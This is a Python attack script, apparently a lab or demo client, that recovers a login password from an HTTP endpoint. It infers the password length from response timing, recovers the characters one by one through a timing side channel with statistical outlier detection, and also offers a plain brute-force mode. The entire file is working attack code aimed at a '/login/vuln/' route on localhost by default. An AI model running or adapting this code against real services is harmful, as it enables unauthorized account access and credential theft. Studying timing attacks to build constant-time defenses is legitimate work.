  GNU nano 7.2                                                                                        client.py
import requests
from timeit import timeit
import argparse
from string import ascii_letters, digits
from itertools import combinations_with_replacement
import numpy as np
import time

def send_request(server_url: str, password: str) -> bool:
    """
    Sends authentication request to the given server.
    """
    params = {"password": password}
    with requests.get(server_url, params, stream=False, timeout=5) as response:
        json_response = response.json()
        response.close()
        if json_response["message"] == "Success":
            return True
        else:
            return False

def find_length(server_url: str, min_len:int=3, max_len:int=4, attempts:int=1000) -> int:
    """
    Method to determine the lenght of the password based on the timing distribution of responses.
    """
    times = {
        length:timeit(lambda: send_request(server_url, " " * length), number=attempts)
        for length in range(min_len, max_len+1)
    }
    print("password length distribution:", times)
    return max(times, key=times.get)

def contains_outlier(data, m=50):
    """
    Detect outliers in an array of numbers using the median and median absolute distance.
    """
    d = np.abs(data - np.median(data))
    mdev = np.median(d)
    s = d/mdev if mdev else np.zeros(len(d))
    return np.any(s>m)

def find_char_at_idx(idx, pass_list, vocab, server_url, num_attempts=100, mode="full"):
    """
    Method for discovery of correct character of the password on a given position.
    """
    timings = {}
    for character in vocab:
        pass_list[idx] = character
        timings[character] = timeit(lambda: send_request(server_url, password="".join(pass_list)), number=num_attempts)
        if mode == "fast": # use statistical method to speed up the search
            if contains_outlier(list(timings.values())):
                break
    print(timings)
    print(f"Idx:{idx}, char found:{max(timings, key=timings.get)}")
    return max(timings, key=timings.get)

def find_password(server_url: str, vocab, pass_len: int, num_attempts, mode="full") -> str:
    password = [" " for _ in range(pass_len)]

    # use timings to determine the correct character in each position
    for i in range(pass_len-1):
        password[i] = find_char_at_idx(i, password, vocab, server_url, num_attempts=num_attempts, mode=mode)

    # bruteforce the last character of the password
    for c in vocab:
        password[-1] = c
        if send_request(server_url, "".join(password)):
            break
    return "".join(password)

def bruteforce_pass(server: str, vocab, length:str) -> str:
    passlist = combinations_with_replacement(vocab, length)
    for password in passlist:
        if send_request(server, "".join(password)):
            return password
    return False

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--server", type=str, default="http://127.0.0.1")
    parser.add_argument("--port", type=int, default=8000)
    parser.add_argument("--min_len", type=int, default=4)
    parser.add_argument("--max_len", type=int, default=8)
    parser.add_argument("--mode", type=str, default="full")
    parser.add_argument("--vocab", type=str, default="digits")
    args = parser.parse_args()

    if args.vocab == "digits":
        vocab = digits
    elif args.vocab == "letters":
        vocab = ascii_letters
    else:
        vocab = ascii_letters + digits

    URL = f"{args.server}:{args.port}/login/vuln/"

    # find password length
    pass_len = find_length(URL, args.min_len,args.max_len, attempts=500)
    #pass_len = 4
    print("The length of the password is:", pass_len)
    if args.mode == "fast":
        print("Starting timing attack - fast")
        password = find_password(URL, vocab,pass_len, num_attempts=50, mode="fast")
        print("The password is: ", password)
        print(f"Connecting with password:'{password}' - SUCCESS:{send_request(URL, password)}")
    elif args.mode == "bruteforce":
        print("Starting bruteforce attack")
        password = bruteforce_pass(URL, vocab, pass_len)
        print("Bruteforce pass:", password)
        print(f"Connecting with password:'{password}' - SUCCESS:{send_request(URL, password)}")
    else:
        print("Starting timing attack - full")
        password = find_password(URL, vocab,pass_len, num_attempts=50, mode="full")
        print("The password is: ", password)
        print(f"Connecting with password:'{password}' - SUCCESS:{send_request(URL, password)}")